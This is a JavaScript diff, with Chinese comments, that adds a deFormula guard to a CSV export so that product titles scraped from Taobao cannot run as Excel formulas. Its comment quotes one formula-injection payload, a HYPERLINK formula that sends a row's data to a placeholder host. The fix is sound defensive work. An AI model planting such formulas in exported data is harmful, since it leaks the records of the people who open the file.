@@ -50,6 +50,31 @@ function esc(s) {
   return '"' + s.replace(/"/g, '""') + '"'
 }
 
+/** 把「会被 Excel 当公式执行」的格子变回纯文本。
+ *
+ * Excel / LibreOffice 把以 `=` `+` `-` `@`（以及 Tab / CR）开头的格子**当公式执行**。
+ * 而这张表里最容易被人做手脚的恰恰是**商品标题**和**物品名**——它们是插件从淘宝
+ * 抓回来的，卖家想写什么就写什么。一个标题写成
+ * `=HYPERLINK("http://x/?"&A1,"点我")` 的商品，导出之后在 Excel 里就是一个
+ * 把整行数据带出去的链接；而这份文件常常是要发给客户或合伙人的
+ * （`exportCsv` 自己的注释就写着「这种文件会被当成完整账目发给别人」）。
+ * 这是 CWE-1236，不是理论：链路上「攻击者能写」与「受害者用 Excel 打开」两头都成立。
+ *
+ * RFC4180 的转义**挡不住这个**：它只管逗号/引号/换行，
+ * 而 `=1+1` 里一个都没有，原样穿过、连引号都不会加。
+ *
+ * 前缀一个单引号：Excel / LibreOffice 视之为「这一格是文本」，显示出来仍是原文。
+ *
+ * **数字必须放行。** `-100.00` 一旦被前缀就在 Excel 里变成文本，
+ * 金额列再也求不了和——而求和正是把账目导成表格的全部意义。
+ * 所以先认数字（含负号与小数），认不出来的才看首字符。
+ */
+const NUMERIC = /^-?\d+(?:\.\d+)?$/
+function deFormula(s) {
+  if (!s || NUMERIC.test(s)) return s
+  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s
+}
+
 /**
  * 拉完当前筛选的全部行并下载成 CSV。
  *
@@ -81,7 +106,9 @@ export async function exportCsv({ fetchPage, columns, name }) {
   // 表格里那几列「虚拟列」（操作按钮、绑定区）在行上没有同名字段，导出没有意义
   const cols = columns.filter((c) => rows.some((r) => r[c.key] !== undefined))
   const head = cols.map((c) => esc(c.label || c.key)).join(',')
-  const body = rows.map((r) => cols.map((c) => esc(cell(r, c))).join(',')).join('\r\n')
+  // `deFormula` 在 `esc` **之前**：先把公式打回文本，再按 RFC4180 转义。
+  // 反过来的话，加完引号的字段首字符成了 `"`，判据就再也认不出 `=` 了。
+  const body = rows.map((r) => cols.map((c) => esc(deFormula(cell(r, c)))).join(',')).join('\r\n')
 
   const blob = new Blob(['﻿' + head + '\r\n' + body], { type: 'text/csv;charset=utf-8' })
   const url = URL.createObjectURL(blob)
